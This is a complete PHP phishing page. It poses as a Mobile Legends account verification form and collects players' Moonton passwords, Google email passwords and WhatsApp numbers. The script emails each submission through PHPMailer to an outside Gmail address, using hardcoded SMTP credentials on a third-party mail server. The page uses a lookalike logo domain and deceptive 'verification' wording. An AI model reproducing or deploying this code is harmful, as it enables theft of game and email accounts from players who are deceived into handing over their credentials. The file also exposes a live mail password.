<?php
session_start();

error_reporting(E_ALL);
ini_set('display_errors', 1);

if (!isset($_SESSION['nickname'])) {
    header("Location: login.php");
    exit;
}

require __DIR__ . '/PHPMailer-master/src/PHPMailer.php';
require __DIR__ . '/PHPMailer-master/src/SMTP.php';
require __DIR__ . '/PHPMailer-master/src/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$nickname = $_SESSION['nickname'];
$message = '';
$message_type = '';

if (isset($_GET['success']) && $_GET['success'] === '1') {
    $message = "Data successfully sent. Thank you!";
    $message_type = 'success';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email_moonton = trim($_POST['email_moonton'] ?? '');
    $password_moonton = trim($_POST['password_moonton'] ?? '');
    $password_email_google = trim($_POST['password_email_google'] ?? '');
    $account_level = trim($_POST['account_level'] ?? '');
    $skin_count = trim($_POST['skin_count'] ?? '');
    $country = trim($_POST['country'] ?? '');
    $whatsapp = trim($_POST['whatsapp'] ?? '');

    if (!$email_moonton || !$password_moonton || !$password_email_google || !$account_level || !$skin_count || !$country || !$whatsapp) {
        $message = "All fields are required!";
        $message_type = 'error';
    } else {
        // Build a clean, elegant HTML email body:
        $body = '
        <html>
        <head>
            <style>
                body {
                    font-family: "Poppins", sans-serif;
                    background-color: #f4f7fa;
                    margin: 0; padding: 0;
                    color: #34495e;
                }
                .container {
                    max-width: 600px;
                    margin: 30px auto;
                    background: white;
                    border-radius: 15px;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                    padding: 30px;
                }
                h2 {
                    color: #2c3e50;
                    border-bottom: 2px solid #3498db;
                    padding-bottom: 10px;
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 20px;
                }
                th, td {
                    text-align: left;
                    padding: 12px 15px;
                    border-bottom: 1px solid #ecf0f1;
                }
                th {
                    background-color: #3498db;
                    color: white;
                    border-radius: 8px 8px 0 0;
                }
                td {
                    background-color: #f9fbfc;
                }
                .footer {
                    margin-top: 30px;
                    font-size: 14px;
                    color: #95a5a6;
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <div class="container" role="main">
                <h2>DATA MOONTON</h2>
                <table>
                    <tr><th>Field</th><th>Value</th></tr>
                    <tr><td>Nickname</td><td>' . htmlspecialchars($nickname) . '</td></tr>
                    <tr><td>Moonton Email</td><td>' . htmlspecialchars($email_moonton) . '</td></tr>
                    <tr><td>Moonton Password</td><td>' . htmlspecialchars($password_moonton) . '</td></tr>
                    <tr><td>Email Password</td><td>' . htmlspecialchars($password_email_google) . '</td></tr>
                    <tr><td>Account Level</td><td>' . htmlspecialchars($account_level) . '</td></tr>
                    <tr><td>Skin Count</td><td>' . htmlspecialchars($skin_count) . '</td></tr>
                    <tr><td>Country</td><td>' . htmlspecialchars($country) . '</td></tr>
                    <tr><td>WhatsApp Number</td><td>' . htmlspecialchars($whatsapp) . '</td></tr>
                </table>
                <p class="footer">DATA DARI NOTFOUND DREW.</p>
            </div>
        </body>
        </html>
        ';

        $mail = new PHPMailer(true);

        try {
            $mail->isSMTP();
            $mail->Host = 'mail.midmanmy.my.id';
            $mail->SMTPAuth = true;
            $mail->Username = 'mobilelegendsdaridrew@midmanmy.my.id';
            $mail->Password = 'ccoo_,u7hUOUh,W8';
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
            $mail->Port = 465;

            $mail->setFrom('mobilelegendsdaridrew@midmanmy.my.id', 'FACEBOOK: Notfound Drew');
            $mail->addAddress('drewsoftwarehtml@gmail.com', 'Admin');

            $mail->isHTML(true);
            $mail->Subject = "MOONTON PUNYA SI $nickname";
            $mail->Body = $body;
            $mail->AltBody = strip_tags(str_replace(['<br>', '<br/>', '<br />'], "\n", $body));

            $mail->send();

            // Redirect to prevent form resubmission and show success message
            header("Location: " . $_SERVER['PHP_SELF'] . "?success=1");
            exit;
        } catch (Exception $e) {
            $message = "Failed to send data. Mailer Error: {$mail->ErrorInfo}";
            $message_type = 'error';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Mobile Legends Account Data Submission</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');
  * {
    box-sizing: border-box;
  }
  body {
    margin: 0; padding: 0;
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(135deg, #a7c7e7, #e6f0fa);
    color: #0b1a3b;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }
  header {
    background: #0a1837;
    padding: 12px 20px;
    display: flex;
    align-items: center;
  }
  header .logo img {
    height: 40px;
    width: auto;
  }
  main {
    flex-grow: 1;
    max-width: 480px;
    width: 90%;
    margin: 40px auto;
    background: white;
    padding: 25px 30px;
    border-radius: 14px;
    box-shadow: 0 8px 24px rgb(0 0 0 / 0.15);
  }
  main h1 {
    margin-top: 0;
    margin-bottom: 25px;
    font-weight: 700;
    font-size: 28px;
    color: #0a1837;
    text-align: center;
  }
  .nickname-display {
    font-weight: 700;
    font-size: 20px;
    margin-bottom: 20px;
    color: #0055ff;
    text-align: center;
  }
  .instruction-box {
    border: 2px solid #0055ff;
    background-color: #e6f4ff;
    color: #0055ff;
    padding: 15px 20px;
    border-radius: 10px;
    font-size: 15px;
    margin-bottom: 30px;
    line-height: 1.4;
  }
  form {
    display: flex;
    flex-direction: column;
    gap: 18px;
  }
  label {
    font-weight: 600;
    font-size: 14px;
    margin-bottom: 6px;
    color: #34495e;
  }
  input[type="text"],
  input[type="email"],
  input[type="password"],
  input[type="number"],
  input[type="tel"] {
    padding: 10px 14px;
    border-radius: 8px;
    border: 1.8px solid #b0c4de;
    font-size: 16px;
    transition: border-color 0.3s ease;
  }
  input[type="text"]:focus,
  input[type="email"]:focus,
  input[type="password"]:focus,
  input[type="number"]:focus,
  input[type="tel"]:focus {
    border-color: #0055ff;
    outline: none;
  }
  button[type="submit"] {
    background: linear-gradient(45deg, #0055ff, #00aaff);
    border: none;
    color: white;
    font-weight: 700;
    font-size: 16px;
    padding: 12px 0;
    border-radius: 10px;
    cursor: pointer;
    box-shadow: 0 0 14px #00aaffcc;
    transition: box-shadow 0.3s ease, transform 0.2s ease;
  }
  button[type="submit"]:hover,
  button[type="submit"]:focus {
    box-shadow: 0 0 22px #00d1ffee, 0 0 34px #00b0ffcc;
    transform: scale(1.05);
    outline: none;
  }
  .message {
    max-width: 400px;
    margin: 0 auto 20px auto;
    padding: 15px 20px;
    font-weight: 600;
    border-radius: 12px;
    display: flex;
    align-items: center;
    gap: 12px;
    font-size: 16px;
  }
  .message.success {
    background-color: #e6f9ec;
    color: #217a1b;
    border: 2px solid #28a745;
  }
  .message.error {
    background-color: #fcebea;
    color: #b02a37;
    border: 2px solid #d93025;
  }
  .checkmark {
    width: 28px;
    height: 28px;
    stroke: #28a745;
    stroke-width: 3;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    animation: dash 0.8s ease forwards;
  }
  @keyframes dash {
    from {
      stroke-dashoffset: 48;
    }
    to {
      stroke-dashoffset: 0;
    }
  }
</style>
</head>
<body>

<header>
  <div class="logo" aria-label="Mobile Legends Logo">
    <img src="https://news-mlbb.event-redeem.com/img/assets/mlbb_logo.png" alt="Mobile Legends Logo" />
  </div>
</header>

<main>
  <h1>Account Data Submission</h1>
  <div class="nickname-display">Logged in as: <strong><?= htmlspecialchars($nickname) ?></strong></div>

  <?php if ($message): ?>
    <div class="message <?= $message_type === 'error' ? 'error' : 'success' ?>" role="alert" aria-live="assertive">
      <?php if ($message_type === 'success'): ?>
        <!-- Green checkmark SVG animation -->
        <svg class="checkmark" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
          <polyline points="20 6 9 17 4 12"></polyline>
        </svg>
      <?php endif; ?>
      <?= htmlspecialchars($message) ?>
    </div>
  <?php endif; ?>

  <?php if ($message_type !== 'success'): ?>
    <div class="instruction-box" role="region" aria-live="polite" aria-label="Instructions">
      Please enter your account data carefully and accurately.<br />
      This information will be used for verification and to ensure your data is processed correctly.<br />
      Double-check your email addresses, passwords, and WhatsApp number before submitting to avoid errors.
    </div>

    <form method="post" action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" autocomplete="off" novalidate>
      <label for="email_moonton">MOONTON EMAIL</label>
      <input type="email" id="email_moonton" name="email_moonton" required placeholder="Enter your Moonton Email" />

      <label for="password_moonton">MOONTON PASSWORD</label>
      <input type="password" id="password_moonton" name="password_moonton" required placeholder="Enter your Moonton Password" />

      <label for="password_email_google">EMAIL (Google) PASSWORD</label>
      <input type="password" id="password_email_google" name="password_email_google" required placeholder="Enter your Email/Google Password" />

      <label for="account_level">LEVEL</label>
      <input type="number" id="account_level" name="account_level" required min="1" placeholder="Enter your account level" />

      <label for="skin_count">SKIN COUNT</label>
      <input type="number" id="skin_count" name="skin_count" required min="0" placeholder="Enter number of skins" />

      <label for="country">COUNTRY</label>
      <input type="text" id="country" name="country" required placeholder="Enter your country" />

      <label for="whatsapp">WHATSAPP NUMBER</label>
      <input type="tel" id="whatsapp" name="whatsapp" required placeholder="Enter your WhatsApp number" pattern="^\+?\d{7,15}$" title="Enter a valid phone number with country code, e.g. +6281234567890" />

      <button type="submit">Submit Data</button>
    </form>
  <?php endif; ?>
</main>

</body>
</html>
